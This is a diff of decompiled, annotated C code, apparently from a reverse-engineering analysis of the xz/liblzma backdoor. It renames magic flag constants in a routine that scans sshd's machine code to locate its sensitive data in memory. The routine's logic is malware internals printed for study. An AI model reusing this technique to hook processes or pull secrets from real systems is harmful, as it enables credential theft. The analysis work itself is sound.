@@ -49,14 +49,14 @@ BOOL sshd_find_sensitive_data_base_via_krb5ccname
       else {
         if ((string_scan_ctx.opcode_window.opcode_window_dword & 0xfffffffd) == X86_OPCODE_1B_XOR_RM_R) {
           if (string_scan_ctx.prefix.modrm_bytes.modrm_mod == '\x03') {
-            if (((string_scan_ctx.prefix.flags_u16 & 0x20) == 0) ||
+            if (((string_scan_ctx.prefix.flags_u16 & DF16_REX) == 0) ||
                ((string_scan_ctx.prefix.modrm_bytes.rex_byte & REX_W) == 0)) {
               dest_reg = string_scan_ctx.prefix.decoded.flags & DF1_MODRM;
-              if ((string_scan_ctx.prefix.flags_u16 & 0x1040) == 0) {
-                if ((string_scan_ctx.prefix.flags_u16 & 0x40) != 0) {
+              if ((string_scan_ctx.prefix.flags_u16 & DF16_MODRM_IMM64_MASK) == 0) {
+                if ((string_scan_ctx.prefix.flags_u16 & DF16_MODRM) != 0) {
                   tracked_reg = 0;
                   dest_reg = string_scan_ctx.prefix.modrm_bytes.modrm_rm;
-                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
+                  if ((string_scan_ctx.prefix.flags_u16 & DF16_REX) != 0) {
 LAB_00103450:
                     dest_reg = string_scan_ctx.prefix.modrm_bytes.modrm_rm |
                             ((string_scan_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
@@ -66,11 +66,11 @@ LAB_00103450:
                 tracked_reg = 0;
               }
               else {
-                if ((string_scan_ctx.prefix.flags_u16 & 0x40) == 0) {
+                if ((string_scan_ctx.prefix.flags_u16 & DF16_MODRM) == 0) {
                   tracked_reg = string_scan_ctx.prefix.decoded.flags2 & DF2_IMM64;
-                  if ((string_scan_ctx.prefix.flags_u16 & 0x1000) == 0) goto LAB_0010346b;
+                  if ((string_scan_ctx.prefix.flags_u16 & DF16_IMM64) == 0) goto LAB_0010346b;
                   tracked_reg = string_scan_ctx.mov_imm_reg_index;
-                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
+                  if ((string_scan_ctx.prefix.flags_u16 & DF16_REX) != 0) {
                     tracked_reg = string_scan_ctx.mov_imm_reg_index |
                              ((string_scan_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
                   }
@@ -78,7 +78,7 @@ LAB_00103450:
                 else {
                   tracked_reg = string_scan_ctx.prefix.modrm_bytes.modrm_reg;
                   dest_reg = string_scan_ctx.prefix.modrm_bytes.modrm_rm;
-                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
+                  if ((string_scan_ctx.prefix.flags_u16 & DF16_REX) != 0) {
                     tracked_reg = string_scan_ctx.prefix.modrm_bytes.modrm_reg |
                              ((string_scan_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1);
                     goto LAB_00103450;
@@ -102,19 +102,19 @@ LAB_0010346b:
                 if (store_scan_ctx.opcode_window.opcode_window_dword == X86_OPCODE_1B_MOV_STORE) {
                   if (((uint)store_scan_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32) {
                     dest_reg = 0;
-                    if ((store_scan_ctx.prefix.flags_u16 & 0x1040) != 0) {
-                      if ((store_scan_ctx.prefix.flags_u16 & 0x40) == 0) {
+                    if ((store_scan_ctx.prefix.flags_u16 & DF16_MODRM_IMM64_MASK) != 0) {
+                      if ((store_scan_ctx.prefix.flags_u16 & DF16_MODRM) == 0) {
                         dest_reg = store_scan_ctx.prefix.decoded.flags2 & DF2_IMM64;
-                        if (((store_scan_ctx.prefix.flags_u16 & 0x1000) != 0) &&
+                        if (((store_scan_ctx.prefix.flags_u16 & DF16_IMM64) != 0) &&
                            (dest_reg = store_scan_ctx.mov_imm_reg_index,
-                           (store_scan_ctx.prefix.flags_u16 & 0x20) != 0)) {
+                           (store_scan_ctx.prefix.flags_u16 & DF16_REX) != 0)) {
                           rex_extension = (store_scan_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3;
                           goto LAB_00103553;
                         }
                       }
                       else {
                         dest_reg = store_scan_ctx.prefix.modrm_bytes.modrm_reg;
-                        if ((store_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
+                        if ((store_scan_ctx.prefix.flags_u16 & DF16_REX) != 0) {
                           rex_extension = (store_scan_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1;
 LAB_00103553:
                           dest_reg = dest_reg | rex_extension & 8;
@@ -124,7 +124,7 @@ LAB_00103553:
                     if (dest_reg == tracked_reg) {
                       // AutoDoc: The following RIP-relative add reconstructs the absolute `.bss` pointer that getenv's return register is being stored into.
                       candidate_store = (u8 *)0x0;
-                      if ((store_scan_ctx.prefix.flags_u16 & 0x100) != 0) {
+                      if ((store_scan_ctx.prefix.flags_u16 & DF16_MEM_DISP) != 0) {
                         candidate_store = store_scan_ctx.instruction +
                                  store_scan_ctx.instruction_size + store_scan_ctx.mem_disp;
                       }
@@ -147,9 +147,9 @@ LAB_00103553:
         else if (string_scan_ctx.opcode_window.opcode_window_dword == X86_OPCODE_1B_MOV_RM_IMM32) {
           if (((((string_scan_ctx.prefix.modrm_bytes.rex_byte & REX_W) == 0) &&
                ((uint)string_scan_ctx.prefix.decoded.modrm >> 8 == 0x50000)) &&
-              ((string_scan_ctx.prefix.flags_u16 & 0x800) != 0)) && (string_scan_ctx.imm_zeroextended == 0)) {
+              ((string_scan_ctx.prefix.flags_u16 & DF16_IMM) != 0)) && (string_scan_ctx.imm_zeroextended == 0)) {
             store_scan_cursor = (u8 *)0x0;
-            if ((string_scan_ctx.prefix.flags_u16 & 0x100) != 0) {
+            if ((string_scan_ctx.prefix.flags_u16 & DF16_MEM_DISP) != 0) {
               store_scan_cursor = string_scan_ctx.instruction + string_scan_ctx.instruction_size + string_scan_ctx.mem_disp;
             }
             data_cursor = (sensitive_data *)(store_scan_cursor + -0x18);
